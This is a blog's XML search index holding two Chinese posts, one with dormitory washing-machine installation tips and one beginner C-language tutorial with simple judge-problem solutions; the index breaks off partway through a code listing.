<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>寝室洗衣机安装小Tips</title>
    <link href="/2023/09/04/%E5%AF%9D%E5%AE%A4%E6%B4%97%E8%A1%A3%E6%9C%BA%E5%AE%89%E8%A3%85%E5%B0%8FTips/"/>
    <url>/2023/09/04/%E5%AF%9D%E5%AE%A4%E6%B4%97%E8%A1%A3%E6%9C%BA%E5%AE%89%E8%A3%85%E5%B0%8FTips/</url>
    
    <content type="html"><![CDATA[<h1 id="寝室洗衣机安装小Tips"><a href="#寝室洗衣机安装小Tips" class="headerlink" title="寝室洗衣机安装小Tips"></a>寝室洗衣机安装小Tips</h1><p>$\mathcal{Author:CoolWind}$</p><h3 id="Tip0-序"><a href="#Tip0-序" class="headerlink" title="Tip0-序"></a>Tip0-序</h3><p>入住新北的小伙伴都会发现，新北是不限电的，因此我们可以在寝室里搞一些<del>小操作</del>，比如安装一个洗衣机。本文将以新北15公寓某宿舍（<del>绝对不是怕被线下真实</del>）的洗衣机安装作为实例，给大家一些安装的Tips。</p><p>同时，本文中没有任何的广告成分，所需要的商品大家可以自行购买相同类型的商品（<del>或者原价加价10块我送到你宿舍</del>）。</p><h3 id="Tip1-洗衣机的选择"><a href="#Tip1-洗衣机的选择" class="headerlink" title="Tip1-洗衣机的选择"></a>Tip1-洗衣机的选择</h3><p>该宿舍选择使用的洗衣机是一台KONKA的二手立式滚筒洗衣机，容量3.0kg，实测可以洗下4-5件衣物。同时，只占据右侧洗手台大概$\dfrac{3}{4}$的空间，保留了一些右侧洗手台的可使用性。</p><p><img src="\img\washingMachine\洗衣机摆放.jpg" alt="洗衣机摆放示意图"></p><h3 id="Tip2-如何进行上水"><a href="#Tip2-如何进行上水" class="headerlink" title="Tip2-如何进行上水"></a>Tip2-如何进行上水</h3><p>该宿舍使用京东购买的4m洗衣机上水管进行上水，并且使用赠送的转接头连接到卫生间的水龙头处进行上水。</p><p><img src="\img\washingMachine\上水管.jpg" alt="上水管"></p><p><img src="\img\washingMachine\上水管连接.jpg" alt="上水管连接"></p><p>同时，由于恰好上水管的外径小于卫生间门缝的宽度，因此在转接的同时我们可以将卫生间的门关上，不影响正常使用。</p><p><img src="\img\washingMachine\上水管走线.jpg" alt="上水管走线"></p><p>在安装转接头时有一个<strong>注意点</strong>，这里放一个<a href="https://b23.tv/5Lks8sh">超链接</a>。</p><p>然后将上水管扭到洗衣机的上水处就完成了上水部分的安装。</p><h3 id="Tip3-如何进行下水"><a href="#Tip3-如何进行下水" class="headerlink" title="Tip3-如何进行下水"></a>Tip3-如何进行下水</h3><blockquote><p>现有一个泳池，注满水需要5h，放干水需要7h，那么进出水口一起开需要多少小时才能将这个水池灌满？</p></blockquote><p>在下水部分，该宿舍将其下水技术进行了一次迭代。</p><p>初版采用直接将下水管放到洗手台下地漏处（地漏上面的盖子可以使用螺丝刀以及任何工具甚至不用工具可以打开），然后将寝室玩成了泳池，水漫金山。</p><p>迭代版本也出于意外，因为作者<del>是个sb</del>，对于自己的安装技术过于自信，认为赠送的上水转接头有漏水bug无法安装，选择购买了一个带有橡胶头和铁扎带的上水转接头，结果还是在上水的时候被<del>射了一身</del>。</p><p><img src="\img\washingMachine\购买的转接头.png" alt="购买的转接头"></p><p>在处理好上水之后，作者动用其一个假期没懂的<del>生锈猪脑</del>，创造性的将下水管连接到转接头上，然后使用转接头下端本身带有的金属将其坠在地漏中，完美的解决了泳池问题带来的问题。</p><p><img src="\img\washingMachine\下水管改造.jpg" alt="下水管改造"></p><p><img src="\img\washingMachine\下水管安装.jpg" alt="下水管安装"></p><p>当然，也可以采用漏斗之类的容器，将其插入到下水道中进行排水，同样可以解决问题。<strong>注意</strong>漏斗容量要足够大，不然一样会水漫金山。</p><h3 id="Tip4-如何进行供电"><a href="#Tip4-如何进行供电" class="headerlink" title="Tip4-如何进行供电"></a>Tip4-如何进行供电</h3><p>供电直接在洗漱区的插口处进行，建议购买一个洗衣机增高架，或者使用插排进行连接，这样可以解决电线不够长的问题。</p><p><img src="\img\washingMachine\供电.jpg" alt="供电"></p>]]></content>
    
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进行一个C语言的入门？</title>
    <link href="/2023/08/26/%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AAC%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%A5%E9%97%A8%EF%BC%9F/"/>
    <url>/2023/08/26/%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AAC%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%A5%E9%97%A8%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="进行一个C语言的入门？"><a href="#进行一个C语言的入门？" class="headerlink" title="进行一个C语言的入门？"></a>进行一个C语言的入门？</h1><p>$\mathcal{Author:CoolWind\quad Group:while(1)\quad Date:2023.8.26}$ </p><h3 id="0x00-一个c语言程序分为几个部分？"><a href="#0x00-一个c语言程序分为几个部分？" class="headerlink" title="0x00 一个c语言程序分为几个部分？"></a>0x00 一个c语言程序分为几个部分？</h3><p><strong>0、分号</strong></p><p>分号作为c语言中每个语句的结束符号，在语句结束的时候需要加入，但是在<strong>预处理</strong>、以及<strong>条件语句</strong>后面不需要加入。 </p><p><strong>1、预处理部分</strong></p><p>这一部分包括所要加载的头文件，使用<code>#include &lt;stdio.h&gt;</code>的指令进行加载。</p><div class="table-container"><table><thead><tr><th style="text-align:center">头文件</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>&lt;stdio.h&gt;</code></td><td style="text-align:center">输入输出函数，如 <code>printf</code>、<code>scanf</code> 等。</td></tr><tr><td style="text-align:center"><code>&lt;stdlib.h&gt;</code></td><td style="text-align:center">内存管理、类型转换、随机数生成等。</td></tr><tr><td style="text-align:center"><code>&lt;string.h&gt;</code></td><td style="text-align:center">字符串操作函数，如 <code>strcpy</code>、<code>strcat</code>、<code>strlen</code> 等。</td></tr><tr><td style="text-align:center"><code>&lt;math.h&gt;</code></td><td style="text-align:center">数学函数，如数学运算、三角函数、对数函数等。</td></tr><tr><td style="text-align:center"><code>&lt;ctype.h&gt;</code></td><td style="text-align:center">字符处理函数，如字符分类、大小写转换等。</td></tr></tbody></table></div><p>包括你要定义的宏，例如<code>#define TRUE 1</code></p><p>此部分不需要加<code>;</code></p><p><strong>2、主函数与定义函数</strong></p><p>所谓主函数就是程序的主要运行部分，在c标准中定义主函数的形式为<code>int main(int argc, char *argv[])</code>，在初学的时候，只需要写成<code>int main()</code>即可，是否加<code>void</code>根据个人喜好来定。</p><p>注意，因为主函数是一个返回<code>int</code>类型的函数，因此在主函数结束的最后要进行<code>return 0</code>，如果你在本地没有<code>return 0</code>大概率可以运行，但是上传到<code>OJ</code>之后可能会报错。</p><p>所谓定义函数就是你自己可以DIY的函数，完成你自己想完成的功能。</p><p><strong>3、变量</strong></p><div class="table-container"><table><thead><tr><th style="text-align:left">变量类型</th><th style="text-align:left">描述和特点</th></tr></thead><tbody><tr><td style="text-align:left"><code>int</code></td><td style="text-align:left">整数类型，通常用来表示整数值。</td></tr><tr><td style="text-align:left"><code>short</code></td><td style="text-align:left">短整数类型，占用较少内存。</td></tr><tr><td style="text-align:left"><code>long</code></td><td style="text-align:left">长整数类型，用于表示较大的整数值。</td></tr><tr><td style="text-align:left"><code>long long</code></td><td style="text-align:left">更长的整数类型，表示更大范围的整数。</td></tr><tr><td style="text-align:left"><code>char</code></td><td style="text-align:left">字符类型，用于表示单个字符。</td></tr><tr><td style="text-align:left"><code>float</code></td><td style="text-align:left">单精度浮点数类型。</td></tr><tr><td style="text-align:left"><code>double</code></td><td style="text-align:left">双精度浮点数类型，提供更高精度。</td></tr><tr><td style="text-align:left"><code>unsigned int</code></td><td style="text-align:left">无符号整数类型，仅包含非负整数。</td></tr><tr><td style="text-align:left"><code>unsigned char</code></td><td style="text-align:left">无符号字符类型。</td></tr><tr><td style="text-align:left"><code>unsigned short</code></td><td style="text-align:left">无符号短整数类型。</td></tr><tr><td style="text-align:left"><code>unsigned long</code></td><td style="text-align:left">无符号长整数类型。</td></tr><tr><td style="text-align:left"><code>unsigned long long</code></td><td style="text-align:left">无符号更长的整数类型。</td></tr></tbody></table></div><p>在c语言中使用变量之前需要进行一个变量的定义，并且在此时可以使用<code>=</code>进行变量的初始化。</p><p>同时，每种数据类型都有自己对应的范围：</p><div class="table-container"><table><thead><tr><th>数据类型</th><th>范围</th></tr></thead><tbody><tr><td><code>char</code></td><td>-128 到 127 或 0 到 255（取决于有无符号修饰）</td></tr><tr><td><code>unsigned char</code></td><td>0 到 255</td></tr><tr><td><code>short</code></td><td>-32,768 到 32,767</td></tr><tr><td><code>unsigned short</code></td><td>0 到 65,535</td></tr><tr><td><code>int</code></td><td>-2,147,483,648 到 2,147,483,647</td></tr><tr><td><code>unsigned int</code></td><td>0 到 4,294,967,295</td></tr><tr><td><code>long</code></td><td>-2,147,483,648 到 2,147,483,647</td></tr><tr><td><code>unsigned long</code></td><td>0 到 4,294,967,295</td></tr><tr><td><code>long long</code></td><td>-9,223,372,036,854,775,808 到 9,223,372,036,854,775,807</td></tr><tr><td><code>unsigned long long</code></td><td>0 到 18,446,744,073,709,551,615</td></tr><tr><td><code>float</code></td><td>大约 1.2E-38 到 3.4E+38</td></tr><tr><td><code>double</code></td><td>大约 2.3E-308 到 1.7E+308</td></tr><tr><td><code>long double</code></td><td>大约 3.4E-4932 到 1.1E+4932</td></tr></tbody></table></div><p>因此，使用数据类型或者选择算法的时候要注意自己的数据范围，不要超过数据范围导致<code>WA</code>。</p><p>同时，变量分为<strong>全局变量</strong>和<strong>局部变量</strong>，<strong>全局变量</strong>顾名思义可以在整个c语言文件中随时随地进行调用，而<strong>局部变量</strong>只能在其所在的代码块以及该代码块所包含的代码块中进行使用。</p><p>如在不同位置有同名变量，那么在代码块中优先使用该代码块中的同名变量，再依次向外使用。</p><p><strong>4、库函数</strong></p><p>在头文件中包含的、可以直接调用的函数都可以称之为库函数。</p><p>例如<code>printf</code>,<code>scanf</code>这样的函数都是库函数，需要自己去积累或者去查询。</p><p><strong>5、运算符</strong></p><div class="table-container"><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述和用途</th></tr></thead><tbody><tr><td style="text-align:left"><code>+</code></td><td style="text-align:left">加法运算符，用于将两个数相加。</td></tr><tr><td style="text-align:left"><code>-</code></td><td style="text-align:left">减法运算符，用于将一个数减去另一个数。</td></tr><tr><td style="text-align:left"><code>*</code></td><td style="text-align:left">乘法运算符，用于将两个数相乘。</td></tr><tr><td style="text-align:left"><code>/</code></td><td style="text-align:left">除法运算符，用于将一个数除以另一个数。</td></tr><tr><td style="text-align:left"><code>%</code></td><td style="text-align:left">取模运算符，返回除法的余数。</td></tr><tr><td style="text-align:left"><code>++</code></td><td style="text-align:left">自增运算符，将操作数的值加一。</td></tr><tr><td style="text-align:left"><code>--</code></td><td style="text-align:left">自减运算符，将操作数的值减一。</td></tr><tr><td style="text-align:left"><code>=</code></td><td style="text-align:left">赋值运算符，用于将右边的值赋给左边的变量。</td></tr><tr><td style="text-align:left"><code>+=</code></td><td style="text-align:left">加法赋值运算符，相当于 <code>a = a + b</code>。</td></tr><tr><td style="text-align:left"><code>-=</code></td><td style="text-align:left">减法赋值运算符，相当于 <code>a = a - b</code>。</td></tr><tr><td style="text-align:left"><code>*=</code></td><td style="text-align:left">乘法赋值运算符，相当于 <code>a = a * b</code>。</td></tr><tr><td style="text-align:left"><code>/=</code></td><td style="text-align:left">除法赋值运算符，相当于 <code>a = a / b</code>。</td></tr><tr><td style="text-align:left"><code>%=</code></td><td style="text-align:left">取模赋值运算符，相当于 <code>a = a % b</code>。</td></tr><tr><td style="text-align:left"><code>==</code></td><td style="text-align:left">相等运算符，检查两个操作数是否相等。</td></tr><tr><td style="text-align:left"><code>!=</code></td><td style="text-align:left">不等运算符，检查两个操作数是否不相等。</td></tr><tr><td style="text-align:left"><code>&gt;</code></td><td style="text-align:left">大于运算符，检查左边的操作数是否大于右边的操作数。</td></tr><tr><td style="text-align:left"><code>&lt;</code></td><td style="text-align:left">小于运算符，检查左边的操作数是否小于右边的操作数。</td></tr><tr><td style="text-align:left"><code>&gt;=</code></td><td style="text-align:left">大于等于运算符，检查左边的操作数是否大于等于右边的操作数。</td></tr><tr><td style="text-align:left"><code>&lt;=</code></td><td style="text-align:left">小于等于运算符，检查左边的操作数是否小于等于右边的操作数。</td></tr><tr><td style="text-align:left"><code>&amp;&amp;</code></td><td style="text-align:left">逻辑与运算符，用于逻辑与操作。</td></tr><tr><td style="text-align:left"><code>!</code></td><td style="text-align:left">逻辑非运算符，取反操作数的逻辑值。</td></tr><tr><td style="text-align:left"><code>&amp;</code></td><td style="text-align:left">按位与运算符，对操作数的每个位执行逻辑与操作。</td></tr><tr><td style="text-align:left"><code>^</code></td><td style="text-align:left">按位异或运算符，对操作数的每个位执行逻辑异或操作。</td></tr><tr><td style="text-align:left"><code>~</code></td><td style="text-align:left">按位取反运算符，反转操作数的每个位。</td></tr><tr><td style="text-align:left"><code>&lt;&lt;</code></td><td style="text-align:left">左移运算符，将操作数的二进制位左移指定的位数。</td></tr><tr><td style="text-align:left"><code>&gt;&gt;</code></td><td style="text-align:left">右移运算符，将操作数的二进制位右移指定的位数。</td></tr><tr><td style="text-align:left"><code>&amp;=</code></td><td style="text-align:left">按位与赋值运算符，相当于 <code>a = a &amp; b</code>。</td></tr><tr><td style="text-align:left"><code>^=</code></td><td style="text-align:left">按位异或赋值运算符，相当于 <code>a = a ^ b</code>。</td></tr><tr><td style="text-align:left"><code>&lt;&lt;=</code></td><td style="text-align:left">左移赋值运算符，相当于 <code>a = a &lt;&lt; b</code>。</td></tr><tr><td style="text-align:left"><code>&gt;&gt;=</code></td><td style="text-align:left">右移赋值运算符，相当于 <code>a = a &gt;&gt; b</code>。</td></tr></tbody></table></div><p><strong>6、条件语句</strong></p><div class="table-container"><table><thead><tr><th>控制语句</th><th>描述和用途</th></tr></thead><tbody><tr><td><code>if</code> 语句</td><td>根据条件的真假来执行不同的代码块。</td></tr><tr><td><code>switch</code> 语句</td><td>基于表达式的值，在多个固定值分支中选择执行代码块。</td></tr><tr><td><code>while</code> 循环</td><td>当条件为真时重复执行代码块。</td></tr><tr><td><code>do-while</code> 循环</td><td>先执行一次代码块，然后在条件为真时重复执行。</td></tr><tr><td><code>for</code> 循环</td><td>初始化、条件判断和迭代步骤的循环。</td></tr><tr><td><code>break</code> 语句</td><td>在循环或 <code>switch</code> 语句中立即退出。</td></tr><tr><td><code>continue</code> 语句</td><td>跳过当前迭代步骤，继续下一次迭代。</td></tr><tr><td><code>goto</code> 语句</td><td>无条件跳转到指定的标签位置。</td></tr></tbody></table></div><p>其中，<code>if</code>,<code>else if</code>,<code>else</code>,<code>while</code>语句后如果不加<code>&#123;&#125;</code>的代码块，那么只能执行该语句之后的<strong>一行</strong>语句。</p><h3 id="0x01-转义字符是什么"><a href="#0x01-转义字符是什么" class="headerlink" title="0x01 转义字符是什么"></a>0x01 转义字符是什么</h3><blockquote><h4 id="2022-C1-A"><a href="#2022-C1-A" class="headerlink" title="2022-C1-A"></a>2022-C1-A</h4><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>今年是北航70周年校庆，让我们祝北航生日快乐！。 要求用三行输出三个句子。分别是:</p><p><strong>Hello, BUAA!</strong></p><p><strong>This year is your 70th birthday!</strong></p><p><strong>Happy birthday!</strong></p></blockquote><p>本题中主要考察大家对<code>printf</code>函数的使用。</p><p><code>printf</code>函数需要现在第一个参数的位置加上<strong>你想要打印的</strong>字符（包括你想要打印的字符以及想要打印的变量的格式控制符，如<code>%d</code>,<code>%lld</code>,<code>%lf</code>等）。</p><p>在第二个参数位置需要<strong>按照顺序</strong>填写上你想要打印的变量的<strong>名称</strong>。</p><p>控制字符对应表：</p><div class="table-container"><table><thead><tr><th style="text-align:left">格式控制字符</th><th style="text-align:left">描述</th><th style="text-align:left">对应的数据类型</th></tr></thead><tbody><tr><td style="text-align:left"><code>%d</code></td><td style="text-align:left">有符号十进制整数</td><td style="text-align:left"><code>int</code></td></tr><tr><td style="text-align:left"><code>%ld</code></td><td style="text-align:left">有符号长整数</td><td style="text-align:left"><code>long</code></td></tr><tr><td style="text-align:left"><code>%u</code></td><td style="text-align:left">无符号十进制整数</td><td style="text-align:left"><code>unsigned int</code></td></tr><tr><td style="text-align:left"><code>%lu</code></td><td style="text-align:left">无符号长整数</td><td style="text-align:left"><code>unsigned long</code></td></tr><tr><td style="text-align:left"><code>%f</code></td><td style="text-align:left">浮点数</td><td style="text-align:left"><code>float</code></td></tr><tr><td style="text-align:left"><code>%lf</code></td><td style="text-align:left">双精度浮点数</td><td style="text-align:left"><code>double</code></td></tr><tr><td style="text-align:left"><code>%c</code></td><td style="text-align:left">字符</td><td style="text-align:left"><code>char</code></td></tr><tr><td style="text-align:left"><code>%s</code></td><td style="text-align:left">字符串</td><td style="text-align:left"><code>char *</code></td></tr><tr><td style="text-align:left"><code>%p</code></td><td style="text-align:left">指针</td><td style="text-align:left">(任意指针类型)</td></tr><tr><td style="text-align:left"><code>%x</code></td><td style="text-align:left">无符号十六进制整数（小写字母）</td><td style="text-align:left"><code>unsigned int</code></td></tr><tr><td style="text-align:left"><code>%X</code></td><td style="text-align:left">无符号十六进制整数（大写字母）</td><td style="text-align:left"><code>unsigned int</code></td></tr><tr><td style="text-align:left"><code>%%</code></td><td style="text-align:left">百分号字符</td><td style="text-align:left">无</td></tr></tbody></table></div><p>转义字符表：</p><div class="table-container"><table><thead><tr><th style="text-align:left">\\’</th><th style="text-align:left"><strong>用于表示字符常量<code>&#39;</code></strong></th></tr></thead><tbody><tr><td style="text-align:left"><strong>\\”</strong></td><td style="text-align:left"><strong>用于表示一个字符产内部的双引号<code>&quot;</code></strong></td></tr><tr><td style="text-align:left"><strong>\\n</strong></td><td style="text-align:left"><strong>用于表示换行</strong></td></tr><tr><td style="text-align:left"><strong>\\r</strong></td><td style="text-align:left"><strong>回车</strong></td></tr><tr><td style="text-align:left"><strong>\\t</strong></td><td style="text-align:left"><strong>水平制表符(Tab)</strong></td></tr></tbody></table></div><p>题解代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, BUAA!\nThis year is your 70th birthday!\nHappy birthday!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-这啥啊？咋输入啊？"><a href="#0x02-这啥啊？咋输入啊？" class="headerlink" title="0x02 这啥啊？咋输入啊？"></a>0x02 这啥啊？咋输入啊？</h3><blockquote><h4 id="2022-C1-B"><a href="#2022-C1-B" class="headerlink" title="2022-C1-B"></a>2022-C1-B</h4><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>式部茉优需要计算学生们的星幽能力值经过增强化后的数值。 现有原能力值 $X_0$ 和加值 $\Delta$，需要你计算出增强后的数值 $X_1$，满足 $X_1=X_0+\Delta$。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入共一行，两个数。第一个数为 $X_0$，第二个数为 $\Delta$。含义如上述描述。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出共一行，一个数。为计算得出的 $X_1$ 数值。</p></blockquote><p>本题主要考察的是<code>scanf</code>函数的使用。</p><p>注意对于<strong>变量</strong>来说，在进行<code>scanf</code>的时候要在变量前面加上取址符<code>&amp;</code>，而对于<strong>数组</strong>来说不需要。</p><p>题解代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>,b=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a+b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-AI就是n个if函数？"><a href="#0x03-AI就是n个if函数？" class="headerlink" title="0x03 AI就是n个if函数？"></a>0x03 AI就是n个if函数？</h3><blockquote><p>曾经有人说if-else是ai的基础，中间忘了，后面忘了。</p><h4 id="2022-C1-D"><a href="#2022-C1-D" class="headerlink" title="2022-C1-D"></a>2022-C1-D</h4><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>青豆正在投球。现在已知青豆投出球的距离，请你帮他算算能否正好投入球框内？</p><p>已知青豆和球框相距53米，如果他投出球的距离小于53米；则输出 <code>Too close!</code> ，如果正好投出了53米，则输出 <code>Bingo!</code> ；如果投出的距离大于53米，则输出 <code>Too far!</code> 。</p><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><p>一个整数 a，代表青豆投出球的距离。</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>一行一个字符串。</p></blockquote><p>考察<code>if-else if-else</code>函数的使用。</p><p>在<code>if</code>后面加上所要判断的判断语句，如果这个语句为真，那么就要进行<code>if</code>后函数块内的内容，为假则不执行，向下进行。</p><p>题解代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);<br>    <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">53</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Too close!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a==<span class="hljs-number">53</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bingo!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Too far!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x04-嗯？这个循环怎么跳不出？"><a href="#0x04-嗯？这个循环怎么跳不出？" class="headerlink" title="0x04 嗯？这个循环怎么跳不出？"></a>0x04 嗯？这个循环怎么跳不出？</h3><blockquote><h4 id="2022-C1-E"><a href="#2022-C1-E" class="headerlink" title="2022-C1-E"></a>2022-C1-E</h4><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>小羊学姐很开兴又有新生来到校园学习啦！兴奋之下，她报名了帮助新生学弟学妹们搬书的志愿活动（大家都知道开学的新教材真的很多啊）。志愿工作当天，有好多书需要搬，书籍被分成了一堆一堆的，每个书堆分别有 a1 , a2 , a3 ,…, an ,… 本书，小羊学姐每一次需要搬一个书堆（有且仅一个）的书到目的地去。由于书籍堆数太多，所以一眼看不出来一共有多少堆，小羊学姐想请你帮忙求出：对于今天的搬书工作，一共有多少本书籍？一共有多少个书堆？她平均每次搬了多少本？（本题的测试数据给得比较简单，题中直接用 <code>int</code>定义变量就可以了）</p><h4 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h4><p>一共有若干行输入，每行输入一个 <code>int</code> 型的正整数，当输入 <code>0</code> 时表明输入结束，且 <code>0</code>不计入书籍堆数</p><h4 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h4><p>一共有一行输出，三个 <code>int</code> 型的正整数，从左往右依次为：书籍总数，书堆总数，平均每次搬运的书籍个数（每两个正整数之间一个空格）</p></blockquote><p>while循环结构是一个很好的东西，这样就省去了你写重复代码的时间，并且看起来不像<del>shit mountain</del>。</p><p>但是<strong>注意</strong>循环跳出条件，不然就会发生本节标题的情况。</p><p><code>while</code>语句后的括号中需要填写的是控制语句，例如<code>while(n&lt;6)</code>就是在变量<code>n</code>小于6的时候执行语句控制下的代码块。</p><p><code>do-while</code>语句是先执行一次<code>do</code>后代码块内的内容之后，如果满足<code>while</code>后的控制条件，那么再次执行该代码块的内容，直到不满足条件。</p><p>题解代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> book=<span class="hljs-number">0</span>,num=<span class="hljs-number">0</span>,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;book);<br>    <span class="hljs-keyword">while</span>(book!=<span class="hljs-number">0</span>)<br>    &#123;<br>        num++;<br>        sum+=book;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;book);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,sum,num,sum/num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> book=<span class="hljs-number">0</span>,num=<span class="hljs-number">0</span>,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;book);<br>        num++;<br>        sum+=book;<br>    &#125;<span class="hljs-keyword">while</span>(book!=<span class="hljs-number">0</span>);<br>    num--;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>,sum,num,sum/num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x05-这循环怎么比上一个简洁"><a href="#0x05-这循环怎么比上一个简洁" class="headerlink" title="0x05 这循环怎么比上一个简洁"></a>0x05 这循环怎么比上一个简洁</h3><blockquote><h4 id="2022-C1-G"><a href="#2022-C1-G" class="headerlink" title="2022-C1-G"></a>2022-C1-G</h4><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个数字 n(4≤n≤10000 ，用 “∗” 打印形状为如样例所示的六边形 。</p><h4 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h4><p>一行，一个数字 n 。</p><h4 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h4><p>第一行，n−2 个 ∗ 。</p><p>第二行，n 个 ∗ 。</p><p>第三行，n−2 个 ∗ 。</p><p>形状为如样例所示的六边形.</p></blockquote><p><code>for</code>循环主要用来简化循环的书写形式，其组成为<code>for(s1;s2;s3)</code>。</p><p>除此之外<code>for</code>循环可以与<code>while</code>循环互相转化，<code>for</code>循环可以有如下等价形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 